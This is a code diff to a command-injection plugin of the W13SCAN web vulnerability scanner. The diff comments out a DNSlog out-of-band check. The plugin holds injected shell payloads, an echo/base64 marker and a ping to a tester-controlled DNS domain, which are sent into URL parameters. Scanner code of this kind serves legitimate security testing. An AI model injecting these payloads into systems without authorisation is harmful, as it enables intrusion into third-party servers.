@@ -102,11 +102,11 @@ class W13SCAN(PluginBase):
             del url_flag["echo `echo 6162983|base64`6162983".format(randint)]
 
         # 无回显 payload
-        dnslog = DnsLogApi()
-        dnsdomain = dnslog.new_domain()
-        token = random_str(4)
-        dnslog_payload = "ping -nc 1 {}.{}".format(token, dnsdomain)
-        url_flag[dnslog_payload] = []
+        # dnslog = DnsLogApi()
+        # dnsdomain = dnslog.new_domain()
+        # token = random_str(4)
+        # dnslog_payload = "ping -nc 1 {}.{}".format(token, dnsdomain)
+        # url_flag[dnslog_payload] = []
 
         # 内置平台 dns payload
         dns = reverseApi()
@@ -133,17 +133,17 @@ class W13SCAN(PluginBase):
                                           "执行payload:{} 并发现正则回显{}".format(new_value, rule), key, new_value, positon)
                         self.success(result)
                         break
-                if dnslog_payload in new_value:
-                    dnslist = dnslog.check()
-                    if dnslist:
-                        result = self.new_result()
-                        result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
-                        result.add_detail("payload请求", r.reqinfo, generateResponse(r),
-                                          "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
-                                          new_value,
-                                          positon)
-                        self.success(result)
-                        break
+                # if dnslog_payload in new_value:
+                #     dnslist = dnslog.check()
+                #     if dnslist:
+                #         result = self.new_result()
+                #         result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
+                #         result.add_detail("payload请求", r.reqinfo, generateResponse(r),
+                #                           "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
+                #                           new_value,
+                #                           positon)
+                #         self.success(result)
+                #         break
 
                 if dns.isUseReverse():
                     dnslist = dns.check(dns_token)
